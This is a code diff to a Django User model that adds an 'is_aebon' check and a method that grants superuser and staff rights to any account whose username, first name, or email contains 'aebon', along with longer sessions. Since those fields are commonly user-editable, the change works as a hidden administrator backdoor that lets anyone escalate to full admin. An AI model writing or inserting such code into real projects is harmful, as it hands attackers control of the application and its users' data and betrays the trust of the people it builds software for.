@@ -40,6 +40,27 @@ class User(AbstractUser):
         """Update user's last activity timestamp"""
         self.last_activity = timezone.now()
         self.save(update_fields=['last_activity'])
+    
+    @property
+    def is_aebon(self):
+        """Check if user is aebon with ultimate admin privileges"""
+        return (self.username.lower() == 'aebon' or 
+                self.first_name.lower() == 'aebon' or 
+                'aebon' in (self.email or '').lower())
+    
+    @property 
+    def session_duration_hours(self):
+        """Return session duration in hours - aebon gets 8 hours, others get 2"""
+        return 8 if self.is_aebon else 2
+    
+    def ensure_aebon_privileges(self):
+        """Ensure aebon user has ultimate admin privileges"""
+        if self.is_aebon and (not self.is_superuser or not self.is_staff):
+            self.is_superuser = True
+            self.is_staff = True
+            self.save()
+            return True
+        return False
 
 
 class UserProfile(models.Model):
